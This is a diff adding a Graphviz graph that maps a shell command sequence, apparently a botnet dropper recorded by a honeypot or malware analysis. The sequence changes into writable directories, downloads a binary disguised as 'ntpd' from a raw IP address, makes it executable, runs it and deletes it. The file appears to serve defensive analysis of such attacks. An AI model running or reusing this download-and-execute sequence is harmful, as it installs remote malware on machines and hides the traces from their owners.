@@ -1,0 +1,23 @@
+digraph {
+2 [label=" cd /tmp"];
+6 [label=" cd /var/run"];
+10 [label=" cd /mnt"];
+14 [label=" cd /root"];
+18 [label=" cd /"];
+22 [label=" wget http://23.94.164.173/ntpd"];
+26 [label=" chmod +x ntpd"];
+31 [label=" ./ntpd"];
+34 [label=" rm -rf ntpd"];
+2 -> 6;
+2 -> 22;
+6 -> 10;
+6 -> 22;
+10 -> 14;
+10 -> 22;
+14 -> 18;
+14 -> 22;
+18 -> 22;
+22 -> 26;
+26 -> 31;
+31 -> 34;
+}
